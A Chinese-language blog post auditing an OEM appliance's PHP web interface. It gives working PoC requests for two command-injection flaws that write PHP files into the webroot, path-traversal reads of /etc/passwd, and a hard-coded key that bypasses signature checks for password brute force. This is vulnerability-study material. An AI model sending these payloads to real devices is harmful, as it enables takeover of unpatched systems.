---
title: "[技术]某oem产品审计学习"
date: 2022-09-30T12:00:00+08:00
draft: false
author: "r0fus0d"

---

比较老的洞了,最近看到有人交了rce,正好学习下,应该是多家oem的产品

<!--more-->

---

## 命令执行1

先看 poc

```
/webui/?g=aaa_portal_auth_local_submit&suffix=%0aecho%20%27%3C%3Fphp%20echo%20%22test%20-%20Open%20source%20project%20%28github.com%2Ftest%2Ftest%29%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F111111112.php&bkg_flag=0
```

全局搜索 `aaa_portal_auth_local_submit` 看下是哪里的问题

定位到 `webui/modules/aaa/portal_auth.mds`

```php
//----------------------------------------------------------------------------------本地认证-----------------------------------
if($get_url_param == "aaa_portal_auth_local_submit"){
	
	$suffix = $_GET['suffix'];
	$config = file_get_contents($portal_catalog."/config.txt");
	$config_arr = json_decode($config,true);

	$tab_name = $_GET['tab_name'];
	$welcome_word = $_GET['welcome_word'];
	$btn_color = $_GET['btn_color'];

	//基本配置
	$baseFlag = $_GET['baseFlag'];
	if(gettype($baseFlag) != 'undefined' && $baseFlag == 1){

		$config_arr = save_config('local',$config_arr,$tab_name,$welcome_word,$btn_color,'','');

		$new_config = json_encode($config_arr);
		file_put_contents($portal_catalog."/config.txt",$new_config);
		//file_put_contents("/mnt/copyconfig.txt", $new_config);//添加一个备份文件，然后将备份文件copy到系统内的文件即可
		backupAuthFile('local');
		echo '{"success":"local_base"}';
		return;
		
	}
	//logo
	if($_GET['bkg_flag'] == 0){
		
		if($_FILES['local_logo_file']['error'] == UPLOAD_ERR_OK){

			$tmp_name = $portal_catalog.'/local/images/localLogo_tmp'.$suffix;
			$final_name = $portal_catalog.'/local/images/localLogo'.$suffix;
			$type = 'local_logo_file';

			if(!checkFileSize($type,$tmp_name,$final_name,$uploadFileSize)){
				return;
			}
		}

		$config_arr = save_config('local',$config_arr,$tab_name,$welcome_word,$btn_color,'','');

		$config_arr[local][local_logo_pic] = $_FILES['local_logo_file']['name'];

		$new_config = json_encode($config_arr);
		file_put_contents($portal_catalog."/config.txt",$new_config);
		//file_put_contents("/mnt/copyconfig.txt", $new_config);//添加一个备份文件，然后将备份文件copy到系统内的文件即可
		backupAuthFile('local');
		echo '{"success":"local_logo"}';
		return;
		
	}else{ //bkg

		//如果tab_name不为空,表示此时需同步修改tab_name等内容
		if($tab_name){
			$config_arr = save_config('local',$config_arr,$tab_name,$welcome_word,$btn_color,'','');
		}
		if($_FILES['local_bkg_file']['error'] == UPLOAD_ERR_OK){
			$tmp_name = $portal_catalog.'/local/images/localBkg_tmp'.$suffix;
			$final_name = $portal_catalog.'/local/images/localBkg'.$suffix;
			$type = 'local_bkg_file';
			
		if(!checkFileSize($type,$tmp_name,$final_name,$uploadFileSize)){
				return;
			}
		}
		$config_arr[local][local_bkg_pic] = $_FILES['local_bkg_file']['name'];
		$new_config = json_encode($config_arr);
		file_put_contents($portal_catalog."/config.txt",$new_config);
		//file_put_contents("/mnt/copyconfig.txt", $new_config);//添加一个备份文件，然后将备份文件copy到系统内的文件即可
		backupAuthFile('local');
		echo '{"success":"local_bkg"}';
		return;
	}
}
```

看下 suffix 参数被传入到了哪里,为什么会触发命令执行

suffix 先后被赋值给了 `tmp_name`,`final_name`, 然后这2个参数被传给了 `checkFileSize` 函数

看下 `checkFileSize` 函数

```php
function checkFileSize($type,$tmp_name,$final_name,$uploadFileSize){
	move_uploaded_file($_FILES[$type]['tmp_name'],$tmp_name);

	if(filesize($tmp_name) - $uploadFileSize > 0){
		exec('rm '.$tmp_name);
		echo '{"warning":"图片大小超过限制","type":"'.$type.'"}';
		return false;
	}else{
		exec('mv '.$tmp_name.' '.$final_name);
		return true;
	}
}
```

很好,看来是危险函数exec执行了我们的命令

这里poc的suffix值是

```markdown
换行符
echo 'test2' >> /tmp/success2

%0Aecho%20%27test2%27%20%3E%3E%20%2Ftmp%2Fsuccess2
```

![](../../img/oem-case/Untitled.png)

![](../../img/oem-case/Untitled%201.png)

我试了下,用这个也行

```
/tmp/ttt || echo 'test3' >> /tmp/success3

%2Ftmp%2Fttt%20%7C%7C%20echo%20%27test3%27%20%3E%3E%20%2Ftmp%2Fsuccess3
```

![](../../img/oem-case/Untitled%202.png)

![](../../img/oem-case/Untitled%203.png)

不过可以看到是有换行符的效果更好

---

## 命令执行2

先看poc

```
/webui/?g=aaa_portal_auth_config_reset&type=%0aecho%20%27%3C%3Fphp%20echo%20%22test%20-%20Open%20source%20project%20%28github.com%2Ftest%2Ftest%29%22%3B%20phpinfo%28%29%3B%20%3F%3E%27%20%3E%3E%20%2Fusr%2Flocal%2Fwebui%2F111111111.php%0a
```

全局搜索 `aaa_portal_auth_local_submit`

```php
if($get_url_param == "aaa_portal_auth_config_reset"){
	$type = $_GET['type'];
	$logo_type = $type.'_logo_pic';
	$bkg_type = $type.'_bkg_pic';

	$config = file_get_contents($portal_catalog."/config.txt");
	$config_arr = json_decode($config,true);

	$config_dft = file_get_contents($portal_catalog."/default_config.txt");
	$config_dft_arr = json_decode($config_dft,true);
	
	if($type == 'adv'){
		$config_arr[diff] = $config_dft_arr[diff];
	}
	$config_arr[$type] = $config_dft_arr[$type];

	//删除图片
	exec('rm '.$portal_catalog.'/'.$type.'/images/'.$type.'*');

	$new_config = json_encode($config_arr);
	file_put_contents($portal_catalog."/config.txt",$new_config);
	backupAuthFile($type);
	echo '{"reset":"'.$type.'"}';
}
```

明晃晃的 exec ,有点过分的

---

## 任意文件读取

先看poc

```yaml
requests:
  - method: GET
    path:
      - "{{BaseURL}}/webui/?g=sys_dia_data_down&file_name=../etc/passwd"
      - "{{BaseURL}}/webui/?g=sys_dia_data_check&file_name=../../../../../../../../etc/passwd"
      - "{{BaseURL}}/webui/?g=sys_capture_file_download&name=../../../../../../../../etc/passwd"
      - "{{BaseURL}}/webui/?g=sys_corefile_sysinfo_download&name=../../../../../../../../etc/passwd"
```

先全局搜下 `sys_dia_data_down`

```php
if( $get_url_param == 'sys_dia_data_down'){
	// if($_POST['file_name']!=null) $param['file_name'] = formatpost($_POST['file_name']);

	$fname = "/mnt/".$_GET['file_name'];	
	$data = file_get_contents($fname);
	Header("Pragma: public");
	Header("Cache-Control: private");
	Header("Content-type: text/plain");
	Header("Accept-Ranges: bytes");
	Header("Content-Length: " . strlen($data));
	Header("Content-Disposition: attachment; filename=".$_GET['file_name'] );
	ob_clean();
	echo $data;
	exit();

}
```

可以看到 file_name 参数没有被过滤直接被 file_get_contents 函数所读取了,导致的任意文件读取

不过 file_get_contents 函数可以造成ssrf,这里由于前面拼接了 /mnt/ ,所以不好进行ssrf

---

## 绕过验证码爆破

先看poc

```php
/remote_auth.php?user=admin&pwd=admin&sign=ba84d9dd91eb304aca57f0a8f052623e
```

这个sign从哪来,其实就硬编码在 `/usr/local/webui/remote_auth.php` 中

```php
if($_GET['user']!=null) $usr = formatget($_GET['user']);
if($_GET['pwd']!=null) $pwd = formatget($_GET['pwd']);
if($_GET['sign']!=null) $sign = formatget($_GET['sign']);
$key= 'saplingos!@#$%^&*';//这个key你们协商后保存一致即可
//ba84d9dd91eb304aca57f0a8f052623e
if(empty($usr)){
	die('user_null');
}
else if(empty($pwd)){
	die('pwd_null');
}
else if (!$sign){
	die('sign_null');
}
else if ($sign != md5($key)){
	die('sign_error');
}
else{
	if (isset($usr, $pwd)) {
		LoginHandler::login($usr, $pwd, $num,'',$remote_auth = true);
	}
	$fail_msg = '';
	if (LoginHandler::isLoginFail()) {
		$fail_msg = $_SESSION[ERROR_STR];
		if (strlen($fail_msg) <= 0) {
			$fail_msg = LocalUtil::getCommonResource('login_failed');
		}
		die($fail_msg);
	}
}
```

我们可以通过任意文件读取漏洞读取key,然后进行爆破
